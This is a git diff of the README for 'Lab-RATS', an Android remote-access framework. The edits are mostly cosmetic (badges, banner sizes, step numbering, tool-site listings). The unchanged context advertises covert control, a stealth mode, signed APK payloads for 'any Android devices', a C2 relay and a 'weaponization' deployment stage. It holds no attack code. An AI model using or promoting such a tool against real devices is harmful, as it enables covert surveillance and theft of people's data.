@@ -8,21 +8,27 @@
   <img src="https://img.shields.io/badge/JDK-17/21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
   <img src="https://img.shields.io/badge/android-SDK_36-green?style=for-the-badge&logo=android&logoColor=white">
   <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
-  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
+  <img src="https://img.shields.io/badge/Security-AES_256-informational?style=for-the-badge&logo=dependencycheck&logoColor=white">
   <img src="https://img.shields.io/badge/relay-node.js-darkgreen?style=for-the-badge&logo=nodedotjs&logoColor=white">
  <br>
-  <img src="https://img.shields.io/badge/Network-IPv6/IPv4-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
-  <img src="https://img.shields.io/badge/Stealth_Mode-Ghost-white?style=for-the-badge&logo=ghostfolio&logoColor=white">
+  <img src="https://img.shields.io/badge/Network-IPv6/IPv4-cyan?style=for-the-badge&logo=gitconnected&logoColor=white">
+  <img src="https://img.shields.io/badge/Stealth_Mode-Ghost-darkred?style=for-the-badge&logo=ghostfolio&logoColor=white">
   <img src="https://img.shields.io/badge/C2-render-black?style=for-the-badge&logo=render&logoColor=white">
   <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
-</p>
+<br>
+  
+  <a href="https://kitploit.com/en/tools/github/k4n3co/lab-rats-v1.6">
+  <img src="https://img.shields.io/badge/Listed_on-kitploit.com-lightgreen?style=for-the-badge&logo=Skeleton&logoColor=white">
+  <a href="https://sectools.dev/item/lab-rats-v1-6">
+  <img src="https://img.shields.io/badge/Listed_on-sectools.dev-white?style=for-the-badge&logo=Hackaday&logoColor=white">
+  </p>
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=38&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=42&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
  />
 </p>
 
-> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S.)*
+> ### Lightweight Android-Based Remote Administration Tool for Security = (L.A.B. - R.A.T.S)<br>
 
 Developed from the ground up by **K4N3CO**, **Lab-RATS** is an **open-source, lightweight Android Remote Administration Framework** packed with **real-time telemetry** and **covert control capabilities**. The framework automates the generation of custom, signed `.apk` payloads for seamless deployment onto any Android devices, paired with a **responsive, web-based C2 dashboard**. Engineered for resilience in modern mobile security environments, **Lab-RATS** delivers a **robust feature suite** operating reliably across both **legacy** and **current Android OS releases**.
 <details>
@@ -34,7 +40,7 @@ Developed from the ground up by **K4N3CO**, **Lab-RATS** is an **open-source, li
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
 alt="Typing Banner"
  />
 </p>
@@ -43,8 +49,6 @@ alt="Typing Banner"
 
 ### What is Direct IPv6 Mode?
 In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web server**. An embedded HTTP server (`NanoHTTPD`) runs inside the **background Android service** and listens directly on port `9191`.
-
-</details>
 
 <details>
 <summary><b>The IPv6 Advantage: Eliminating CGNAT & Port Forwarding</b></summary>
@@ -78,7 +82,7 @@ In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web s
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
 </p>
 
   > [!IMPORTANT]
@@ -114,7 +118,7 @@ In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web s
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
 </p>
 
 <details>
@@ -183,7 +187,7 @@ In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web s
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
 </p>
 
 <details>
@@ -306,7 +310,7 @@ In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web s
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
 </p>
 
 ### To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:
@@ -355,10 +359,13 @@ In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web s
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
 </p>
 
-> **Lab-RATS** supports **TWO** primary methods to **Receive Data, Connect Remotely & Track your Devices**.
+> **⚠️ Prerequisite**: Before building the APK, you must configure an active Webhook URL to receive device communications.<br>
+### Step One:
+**Lab-RATS** supports **TWO** primary methods to **Receive Data, Connect Remotely & Track your Devices**.<br>
+**Select & configure** your preferred option from this section then proceed to Get Started section below.
 
 <details>
   <summary><b>📸 View Direct IPv6 (Google Sheet) vs. Render Cloud Relay (Node.js) Chart</summary></b>
@@ -476,11 +483,14 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
  />
 </p>
 
-### 1. Build the APK (on PC)
+> **⚠️ Prerequisite**: Before building the APK, you must configure an active Webhook URL to receive device communications.<br>
+**First Step**: Select & configure your preferred option from the section above to proceed.
+
+### Step 2. Build the APK (on PC)
 
   #### Download the Repository:
   ```
@@ -514,7 +524,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 
 ---
 
-### 2. Deploy & Install onto Android Devices
+### Step 3. Deploy & Install onto Android Devices
 > **Deployment** is **a Multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
 <details>
@@ -565,7 +575,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
 </p>
 
 | File                                                               | Subject & Contents                                                  |
@@ -589,13 +599,13 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
 </p>
 
 **If** you find **Lab-RATS Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
 </p>
 
 **Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.
@@ -603,7 +613,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
  />
 </p>
 
@@ -612,7 +622,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
  />
 </p>
 
@@ -647,7 +657,7 @@ https://github.com/user-attachments/assets/c82a46fd-2a15-4e7f-864e-d4b61d6b96e9
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
  />
 </p>
 
@@ -792,7 +802,7 @@ https://github.com/user-attachments/assets/c82a46fd-2a15-4e7f-864e-d4b61d6b96e9
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
  />
 </p>
 
@@ -801,7 +811,7 @@ https://github.com/user-attachments/assets/c82a46fd-2a15-4e7f-864e-d4b61d6b96e9
 ---
 
 <p align="left">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=30&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
  />
 </p>
 
